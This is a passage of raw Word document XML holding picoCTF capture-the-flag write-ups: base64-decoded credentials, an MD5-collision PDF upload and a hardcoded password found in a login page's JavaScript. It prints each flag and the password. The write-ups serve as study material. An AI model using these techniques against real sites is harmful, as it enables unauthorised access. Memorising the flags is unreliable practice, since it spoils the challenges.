          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="018DB2AB" wp14:editId="340C052A">
            <wp:extent cx="3665538" cy="6934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7"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3665538" cy="693480"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="715E3BE6" w14:textId="101B718B" w:rsidR="000B5615" w:rsidRDefault="00B7152D" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">$echo </w:t>
      </w:r>
      <w:r w:rsidRPr="00B7152D">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>YWRtaW4 |base64 -d</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73EDC201" w14:textId="057840E5" w:rsidR="001C530B" w:rsidRDefault="00233019" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>user: admin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BF5030D" w14:textId="40DD50F9" w:rsidR="000B5615" w:rsidRDefault="000B5615" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>$ e</w:t>
      </w:r>
      <w:r w:rsidRPr="000B5615">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">cho cGljb0NURns1M3J2M3JfNTNydjNyXzUzcnYzcl81M3J2M3JfNTNydjNyfQ |base64 -d  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E1B905C" w14:textId="7B785D09" w:rsidR="001C530B" w:rsidRDefault="00233019" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t xml:space="preserve">pw: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00233019">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00233019">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>{53rv3r_53rv3r_53rv3r_53rv3r_53rv3r}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60FF0726" w14:textId="32C21FF0" w:rsidR="001C530B" w:rsidRDefault="001C530B" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2BB6F0FA" w14:textId="40ABF37E" w:rsidR="00721F7B" w:rsidRDefault="00721F7B" w:rsidP="00E114AB">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0"/>
        <w:ind w:left="709"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
        <w:t>It is my Birthday</w:t>
      </w:r>
      <w:r w:rsidR="00E114AB">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:hAnsi="inherit" w:cs="Open Sans"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="1D253B"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2447756C"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64707877" w14:textId="77777777" w:rsidR="00721F7B" w:rsidRDefault="00721F7B" w:rsidP="00721F7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9CA4AF7" w14:textId="77777777" w:rsidR="00721F7B" w:rsidRDefault="00721F7B" w:rsidP="00721F7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0AAC87C" w14:textId="77777777" w:rsidR="00721F7B" w:rsidRDefault="00721F7B" w:rsidP="00721F7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2DA2652" w14:textId="77777777" w:rsidR="00721F7B" w:rsidRDefault="00721F7B" w:rsidP="00721F7B">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I sent out 2 invitations to all of my friends for my birthday! I'll know if they get stolen because the two invites look similar, and they even have the same md5 hash, but they are slightly different! You wouldn't believe how long it took me to find a collision. Anyway, see if you're invited by submitting 2 PDFs to my website. </w:t>
      </w:r>
      <w:hyperlink r:id="rId118" w:tgtFrame="_blank" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>http://mercury.picoctf.net:11590/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6860B3F6" w14:textId="431122FF" w:rsidR="00BE3C0E" w:rsidRDefault="00BE3C0E" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">d5 hash </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>collision</w:t>
      </w:r>
      <w:r w:rsidR="00E16DA0">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidRPr="00BE3C0E">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00BE3C0E">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve"> collision is when you find two files to have the same hash.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D68A2B7" w14:textId="5C592430" w:rsidR="00BE3C0E" w:rsidRDefault="00BE3C0E" w:rsidP="00BE3C0E">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>G</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">oogle </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>d5 hash collision example</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B100CE1" w14:textId="5FACAD07" w:rsidR="00BE3C0E" w:rsidRDefault="00BE3C0E" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">I found on </w:t>
      </w:r>
      <w:hyperlink r:id="rId119" w:history="1">
        <w:r w:rsidRPr="00BE3C0E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          </w:rPr>
          <w:t>this</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve"> website, there are two files with same md5 hash sum </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52CF7B6D" w14:textId="6BE3918A" w:rsidR="00BE3C0E" w:rsidRDefault="00000000" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId120" w:history="1">
        <w:r w:rsidR="00BE3C0E" w:rsidRPr="00BE3C0E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          </w:rPr>
          <w:t>https://www.mathstat.dal.ca/~selinger/md5collision/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="14535BA3" w14:textId="5CEF4378" w:rsidR="00E16DA0" w:rsidRDefault="00E16DA0" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77E1B91B" w14:textId="41F5A7C2" w:rsidR="00BE3C0E" w:rsidRDefault="00E16DA0" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2ED02FF3" wp14:editId="04EAE23B">
            <wp:extent cx="6332220" cy="2270125"/>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21"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6332220" cy="2270125"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="08318B68" w14:textId="6FBDC4A8" w:rsidR="00E16DA0" w:rsidRDefault="00E16DA0" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E2E63DB" w14:textId="364A65A7" w:rsidR="00E16DA0" w:rsidRDefault="00E16DA0" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>download and rename these 2 files</w:t>
      </w:r>
      <w:r w:rsidRPr="00E16DA0">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50B2D312"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0E9DD791" w14:textId="25C1C637" w:rsidR="00E16DA0" w:rsidRPr="00E16DA0" w:rsidRDefault="00E16DA0" w:rsidP="00E16DA0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E16DA0">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">└─$ mv erase erase.pdf                                                           </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58639870" w14:textId="77777777" w:rsidR="00E16DA0" w:rsidRPr="00E16DA0" w:rsidRDefault="00E16DA0" w:rsidP="00E16DA0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E16DA0">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>┌──(kali</w:t>
      </w:r>
      <w:r w:rsidRPr="00E16DA0">
        <w:rPr>
          <w:rFonts w:ascii="Batang" w:eastAsia="Batang" w:hAnsi="Batang" w:cs="Batang" w:hint="eastAsia"/>
        </w:rPr>
        <w:t>㉿</w:t>
      </w:r>
      <w:r w:rsidRPr="00E16DA0">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>kali)-[~/Downloads]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F2A8B36" w14:textId="7FDBD474" w:rsidR="00E16DA0" w:rsidRDefault="00E16DA0" w:rsidP="00E16DA0">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E16DA0">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>└─$ mv hello hello.pdf</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="483461C6" w14:textId="12FBDAEB" w:rsidR="00E16DA0" w:rsidRDefault="00E16DA0" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>upload these 2 files</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="630A356C" w14:textId="6E158A76" w:rsidR="00E16DA0" w:rsidRDefault="00E16DA0" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">we get the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>index.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve"> file</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B6DB738" w14:textId="4D96FC62" w:rsidR="00E16DA0" w:rsidRDefault="00E16DA0" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="345D25DA" wp14:editId="67C9EEBD">
            <wp:extent cx="4975860" cy="4048681"/>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22"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4979276" cy="4051460"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A7056AC" w14:textId="52B9EFA2" w:rsidR="007C33FA" w:rsidRDefault="007C33FA" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="422AE9F3" w14:textId="4B8A8870" w:rsidR="007C33FA" w:rsidRDefault="00E16DA0" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E16DA0">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">FLAG: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E16DA0">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E16DA0">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>{c0ngr4ts_u_r_1nv1t3d_3d3e4c57}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CA0FC25" w14:textId="66F5C78B" w:rsidR="00B6083C" w:rsidRDefault="00B6083C" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia" w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D24F9F9" w14:textId="77777777" w:rsidR="00B6083C" w:rsidRDefault="00B6083C" w:rsidP="00B6083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Local Authority</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E969914"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127B6305" w14:textId="77777777" w:rsidR="00B6083C" w:rsidRDefault="00B6083C" w:rsidP="00B6083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Exploitationinspector</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="2292669F" w14:textId="77777777" w:rsidR="00B6083C" w:rsidRDefault="00B6083C" w:rsidP="00B6083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577B741" w14:textId="77777777" w:rsidR="00B6083C" w:rsidRDefault="00B6083C" w:rsidP="00B6083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3CBE1C1E" w14:textId="77777777" w:rsidR="00B6083C" w:rsidRDefault="00B6083C" w:rsidP="00B6083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flag?Go</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve"> to this </w:t>
      </w:r>
      <w:hyperlink r:id="rId123" w:tgtFrame="_blank" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
            <w:color w:val="5969F6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
          </w:rPr>
          <w:t>website</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t> and see what you can discover.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DF510DC" w14:textId="292AF390" w:rsidR="00B6083C" w:rsidRDefault="00734CC9" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:lang w:val="en-CA"/>
        </w:rPr>
        <w:t>Hint:</w:t>
      </w:r>
      <w:r w:rsidRPr="00734CC9">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How is the password checked on this website?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FCEA078" w14:textId="429CC8C0" w:rsidR="00734CC9" w:rsidRDefault="00734CC9"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0D745A10" wp14:editId="43AFD75A">
            <wp:extent cx="6309907" cy="388653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24"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6309907" cy="3886537"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="13CE4C50" w14:textId="6CE87519" w:rsidR="00734CC9" w:rsidRDefault="00734CC9"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Click on </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>login.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="2CE11E7E" w14:textId="09A88B40" w:rsidR="00CE3B46" w:rsidRDefault="00CE3B46" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2D5618D1" wp14:editId="5B02E62A">
            <wp:extent cx="4755292" cy="2240474"/>
            <wp:effectExtent l="0" t="0" r="762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25"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4755292" cy="2240474"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="21F2CA07" w14:textId="4BE71F85"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Secure.js looks interesting </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CB110EC" w14:textId="1C101473" w:rsidR="00CE3B46" w:rsidRDefault="00CE3B46" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CE3B46">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="538B8566" wp14:editId="2A897638">
            <wp:extent cx="4138019" cy="1402202"/>
            <wp:effectExtent l="0" t="0" r="0" b="762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126"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4138019" cy="1402202"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="33D74AEF" w14:textId="65628A30" w:rsidR="00CE3B46" w:rsidRDefault="00CE3B46" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CE3B46">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>username === 'admin' &amp;&amp; password === 'strongPassword098765'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="105C4BB3" w14:textId="2E15723D" w:rsidR="00CE3B46" w:rsidRDefault="00CE3B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input this credential we got the flag:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4603A064" w14:textId="0CA33B6E" w:rsidR="00734CC9" w:rsidRDefault="00CE3B46" w:rsidP="001F4DD4">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00CE3B46">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00CE3B46">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans" w:cs="Open Sans"/>
          <w:color w:val="222A42"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>{j5_15_7r4n5p4r3n7_05df90c8}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D2B8FAC" w14:textId="3B33B9D6" w:rsidR="00A35726" w:rsidRDefault="00A35726" w:rsidP="001F4DD4">
      <w:pPr>
